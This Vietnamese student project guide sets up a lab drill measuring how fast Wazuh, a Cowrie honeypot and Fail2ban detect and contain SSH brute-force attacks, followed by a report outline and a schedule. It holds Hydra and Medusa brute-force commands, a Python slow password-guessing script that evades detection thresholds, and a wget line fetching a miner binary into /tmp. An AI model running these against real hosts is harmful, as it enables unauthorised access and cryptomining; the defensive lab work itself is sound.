Trên máy tấn công **Kali Linux**, tạo một kịch bản bọc (`run_drill.sh`) ghi lại chính xác dấu thời gian bắt đầu tấn công `t_attack_start` ra tệp `attack_runs.csv` trước khi phát động mỗi lần chạy:

```bash
#!/bin/bash
# Cú pháp: ./run_drill.sh <KICH_BAN> <LAN_CHAY> <LENH_TAN_CONG>
SCENARIO=$1
RUN_ID=$2
shift 2
T_START=$(date -u '+%Y-%m-%dT%H:%M:%S.%3NZ')
echo "$SCENARIO,$RUN_ID,$T_START" >> attack_runs.csv
echo "[+] Bắt đầu $SCENARIO - Lần $RUN_ID lúc $T_START"
eval "$@"
```

Bốn kịch bản diễn tập thực thi từ Kali Linux nhắm vào `<IP_MAY_CHU_LAB>`:

- **Kịch bản A (Brute-Force cường độ cao bằng [THC Hydra](https://github.com/vanhauser-thc/thc-hydra?ref=error.ch)):**
  ```bash
  ./run_drill.sh "Scenario_A" 1 "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 16 ssh://<IP_MAY_CHU_LAB>:22"
  ```
- **Kịch bản B (Brute-Force phân tán nhiều tài khoản bằng Medusa):**
  ```bash
  ./run_drill.sh "Scenario_B" 1 "medusa -h <IP_MAY_CHU_LAB> -U users.txt -P pass.txt -M ssh -t 8"
  ```
- **Kịch bản C (Tấn công dò quét chậm Low-and-Slow bằng Python Paramiko, giãn cách 25 giây/lần):**
  Tạo tệp `low_and_slow_ssh.py` trên Kali Linux:
  ```python
  import sys, time, paramiko

  target_ip = sys.argv[1]
  passwords = [
      "123456",
      "password",
      "admin123",
      "ubuntu2026",
      "root123",
      "qwerty",
      "letmein",
  ]
  for idx, pwd in enumerate(passwords, 1):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
      print(
          f"[{time.strftime('%H:%M:%S')}] Lần thử {idx}: root/{pwd}", flush=True
      )
      client.connect(
          target_ip, port=22, username="root", password=pwd, timeout=5
      )
    except Exception:
      pass
    finally:
      client.close()
    if idx < len(passwords):
      time.sleep(25)  # Giãn cách 25 giây để né ngưỡng ngắn hạn
```
- **Kịch bản D (Mô phỏng đăng nhập thành công và chạy lệnh tải mã độc kích hoạt Playbook 2 & 3):**
  Đăng nhập vào cổng 22 của Cowrie Honeypot và chạy lệnh:
  ```bash
  uname -a && wget http://192.168.10.99:8000/test_miner.elf -O /tmp/xmrig && chmod +x /tmp/xmrig
  ```

Sau mỗi lần chạy, gỡ luật chặn tạm thời trên máy đích (`sudo iptables -F` hoặc chờ script gỡ) trước khi thực hiện lần chạy tiếp theo cho đủ $N = 15$ lần. Đối chiếu dấu thời gian trong:
1. `attack_runs.csv` trên Kali Linux $\rightarrow$ lấy $t_{\text{attack\_start},i}$
2. `/var/ossec/logs/alerts/alerts.json` trên Wazuh Manager $\rightarrow$ lấy $t_{\text{detect},i}$
3. `/var/ossec/logs/active-responses.log` trên Target Lab Host $\rightarrow$ lấy $t_{\text{mitigate},i}$

Áp dụng đúng hai công thức trong Mục 11.4 của đề cương để lập bảng tổng hợp:
- $\text{MTTD} = \frac{1}{N}\sum_{i=1}^{N}(t_{\text{detect},i} - t_{\text{attack\_start},i})$
- $\text{MTTC} = \frac{1}{N}\sum_{i=1}^{N}(t_{\text{mitigate},i} - t_{\text{detect},i})$

## 5. Hướng Dẫn Viết Báo Cáo Tổng Kết & Checklist Minh Chứng Hình Ảnh

Khi viết cuốn **Báo cáo tổng kết đề tài NCKH SV**, bạn giữ nguyên khung 4 Chương ở **Mục 12.1** của bản Thuyết minh đề cương và chèn đầy đủ các minh chứng thực nghiệm sau:

| Chương trong Báo cáo tổng kết | Nội dung cốt lõi cần viết | Danh sách ảnh chụp màn hình (Screenshots) cần lưu lại khi làm Lab |
| :--- | :--- | :--- |
| **Chương 1: Cơ sở lý thuyết và kiến trúc tổng thể** | Lý thuyết SSH ([RFC 4251](https://www.rfc-editor.org/rfc/rfc4251.txt)), phân loại Brute-Force & ánh xạ [MITRE ATT&CK](https://attack.mitre.org/techniques/T1110/), kiến trúc Wazuh SIEM, Cowrie Honeypot, Fail2ban, Zero Trust ([NIST SP 800-207](https://nvlpubs.nist.gov/nistpubs/specialpublications/NIST.SP.800-207.pdf)) và vòng đời [NIST SP 800-61 Rev. 2](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf). | 1. Sơ đồ kiến trúc 3 phân vùng mạng (vẽ bằng Draw.io / Mermaid).<br>2. Sơ đồ luồng xử lý log từ Cowrie/SSHD $\rightarrow$ Wazuh Agent $\rightarrow$ Manager $\rightarrow$ Active Response. |
| **Chương 2: Triển khai hệ thống giám sát, Honeypot và quy tắc phát hiện** | Quy trình cài đặt thực tế, cấu hình Docker Cowrie, chuyển hướng cổng `iptables`, cấu hình SSH cổng 2222 + 2FA TOTP, và giải thích từng rule trong `local_rules.xml`. | 3. Ảnh `docker ps` và `iptables -t nat -L -n -v` chuyển tiếp cổng 22 sang 2223.<br>4. Ảnh quét QR `google-authenticator` và đăng nhập SSH cổng 2222 yêu cầu `Verification code`.<br>5. Ảnh kết quả kiểm thử `wazuh-logtest` báo khớp Rule `100102`, `100103`, `100105`. |
| **Chương 3: Tự động hóa ứng phó sự cố và xây dựng 03 Playbook** | Lưu đồ thuật toán và bảng đặc tả 4 giai đoạn NIST (Chuẩn bị – Phát hiện – Ngăn chặn/Loại trừ/Phục hồi – Sau sự cố) cho 3 Playbook; giải thích mã nguồn `host-isolate.sh` và `forensic-triage.sh`. | 6. Sơ đồ hoạt động của 3 Playbook.<br>7. Ảnh `iptables -L ISOLATION_CHAIN -n -v` chứng minh máy bị cô lập nhưng vẫn `ACCEPT` cổng `1514, 1515` về Wazuh Manager.<br>8. Ảnh thư mục `/var/log/forensics_evidence/` chứa gói `.tar.gz` và kết quả kiểm tra `sha256sum -c`. |
| **Chương 4: Phân tích dữ liệu Honeypot 4 tuần và báo cáo diễn tập** | Trình bày bảng và biểu đồ kết quả chạy `analyze_cowrie_4weeks.py` trên dữ liệu 28 ngày; trình bày thiết kế 4 kịch bản diễn tập và bảng kết quả đo `MTTD`, `MTTC` ($N=15$ lần) so sánh Thủ công vs. Tự động. | 9. Ảnh Wazuh Dashboard hiển thị biểu đồ sự kiện Cowrie trong 4 tuần và bản đồ GeoIP.<br>10. Ảnh terminal Kali Linux chạy `hydra`, `medusa`, `low_and_slow_ssh.py`.<br>11. Ảnh log `/var/ossec/logs/alerts/alerts.json` và `/var/ossec/logs/active-responses.log` khớp dấu thời gian từng giây. |
| **Phụ lục A, B, C** | Đưa toàn văn mã nguồn cấu hình sạch, có chú thích tiếng Việt rõ ràng. | - Phụ lục A: `local_rules.xml`<br>- Phụ lục B: `host-isolate.sh`, `forensic-triage.sh`, `ossec.conf`<br>- Phụ lục C: `docker-compose.yml`, `jail.local`, `sshd_config` |

## 6. Lộ Trình Phân Chia Công Việc Từng Tháng Cho 2 Thành Viên (11/2026 – 05/2027)

- **Tháng 11/2026 (Hoàn tất thủ tục & Chuẩn bị Lab):** Nộp thuyết minh đề cương trên `qlkh.tdmu.edu.vn`; dựng máy ảo Ubuntu Server + Kali Linux; vẽ sơ đồ kiến trúc Chương 1.
- **Tháng 12/2026 (Hoàn thành Sản phẩm a - Phần hạ tầng):** Long dựng Wazuh SIEM + cấu hình SSH Zero Trust (Ed25519 + 2FA TOTP); Thịnh dựng Docker Cowrie Honeypot + cấu hình `iptables` NAT + Fail2ban; kết nối Wazuh Agent thành công.
- **Tháng 01/2027 (Hoàn thành Rule phát hiện & Bắt đầu thu thập dữ liệu Tuần 1–2):** Cùng viết và test `local_rules.xml` bằng `wazuh-logtest`; mở cổng 22 vào Cowrie Honeypot để bắt đầu thu thập dữ liệu 24/7 (Tuần 1 và Tuần 2); viết xong bản thảo Chương 1 và Chương 2.
- **Tháng 02/2027 (Hoàn thành Sản phẩm b - Đủ 4 tuần dữ liệu & Thống kê):** Thu thập hết Tuần 3 và Tuần 4+ (đủ $\ge 28$ ngày); chạy script `analyze_cowrie_4weeks.py` xuất toàn bộ bảng số liệu và biểu đồ cho Mục 4.1, 4.2.
- **Tháng 03/2027 (Hoàn thành Sản phẩm c - Phần 3 Playbook & Active Response):** Viết đặc tả 3 Playbook theo NIST SP 800-61 Rev. 2; lập trình và kiểm thử `firewall-drop`, `host-isolate.sh`, `forensic-triage.sh`; viết xong bản thảo Chương 3.
- **Tháng 04/2027 (Tổ chức diễn tập 4 kịch bản & Đo MTTD, MTTC):** Đồng bộ NTP; chạy 4 kịch bản diễn tập ($15$ lần Thủ công + $15$ lần Tự động); tính toán bảng MTTD, MTTC và hoàn thiện Chương 4.
- **Tháng 05/2027 (Đóng quyển Báo cáo tổng kết & Nghiệm thu):** Rà soát định dạng Word theo mẫu báo cáo tổng kết của Viện Công nghệ số, đóng gói mã nguồn + bộ dữ liệu 4 tuần lên GitHub/Google Drive, làm slide thuyết trình (tối đa 10–12 slides) và bảo vệ nghiệm thu.
